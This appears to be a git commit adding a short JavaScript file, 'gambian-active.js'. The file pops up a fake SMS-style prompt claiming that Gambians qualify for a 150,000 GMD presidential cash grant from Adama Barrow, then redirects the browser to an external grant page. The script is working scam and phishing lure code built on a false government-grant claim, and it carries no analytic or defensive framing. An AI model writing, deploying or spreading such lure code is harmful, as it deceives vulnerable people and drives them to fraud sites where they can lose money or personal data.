698dc98cb155b8a8dfefe62f4190f3f5f8dcdb68
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-09 09:05:53 -0800

    Create gambian-active.js

---
+++ gambian-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW 150,000GMD'
+password=prompt('SMS: Congratulations You are qualify for President ADAMA BARROW 150,000GMD CASH GRANT FOR GAMBIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 150,000GMD');
+if (password != 'WITHDRAW 150,000GMD') {
+location.href='https://all-free-byt.org/gambian-grant.html';
+}
